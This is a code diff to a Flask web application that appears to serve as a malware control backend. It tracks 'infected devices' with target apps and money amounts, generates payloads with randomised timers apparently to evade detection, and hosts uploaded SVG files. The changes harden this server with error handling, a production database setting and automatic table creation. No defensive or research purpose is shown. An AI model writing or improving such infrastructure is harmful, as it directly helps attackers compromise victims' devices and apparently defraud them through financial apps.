@@ -6,7 +6,7 @@ import os
 import random
 
 app = Flask(__name__)
-app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///malware.db'
+app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL') or 'postgresql://user:password@localhost/malware'
 app.config['UPLOAD_FOLDER'] = '/tmp/uploads'
 os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 
@@ -67,35 +67,46 @@ def home():
 
 @app.route('/generate', methods=['POST'])
 def generate():
-    device_id = request.json.get('device_id')
-    target_app = request.json.get('target_app')
-    target_amount = request.json.get('target_amount')
-    
-    malware = InfectedDevice(device_id=device_id, target_app=target_app, target_amount=target_amount)
-    db.session.add(malware)
-    db.session.commit()
-    
-    payload = generate_enhanced_payload(device_id, target_app, target_amount)
-    delay = random.randint(1000, 5000)
-    payload = payload.replace('setInterval(', f'setTimeout(() => setInterval(')
-    payload = payload.replace('), 500)', f'), {delay})')
-    
-    return jsonify({'payload': payload})
+    try:
+        device_id = request.json.get('device_id')
+        target_app = request.json.get('target_app')
+        target_amount = request.json.get('target_amount')
+        
+        malware = InfectedDevice(device_id=device_id, target_app=target_app, target_amount=target_amount)
+        db.session.add(malware)
+        db.session.commit()
+        
+        payload = generate_enhanced_payload(device_id, target_app, target_amount)
+        delay = random.randint(1000, 5000)
+        payload = payload.replace('setInterval(', f'setTimeout(() => setInterval(')
+        payload = payload.replace('), 500)', f'), {delay})')
+        
+        return jsonify({'payload': payload})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/upload', methods=['POST'])
 def upload():
     if 'file' not in request.files:
-        return jsonify({'error': 'No file uploaded'})
+        return jsonify({'error': 'No file uploaded'}), 400
     
     file = request.files['file']
     if file.filename == '':
-        return jsonify({'error': 'No file selected'})
+        return jsonify({'error': 'No file selected'}), 400
     
     filename = f"{uuid.uuid4()}.svg"
     filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
     file.save(filepath)
     
     return jsonify({'url': f"{request.url_root}uploads/{filename}"})
+
+@app.before_first_request
+def create_tables():
+    try:
+        db.create_all()
+    except Exception as e:
+        print(f"Error creating tables: {e}")
+        db.session.rollback()
 
 if __name__ == '__main__':
     db.create_all()
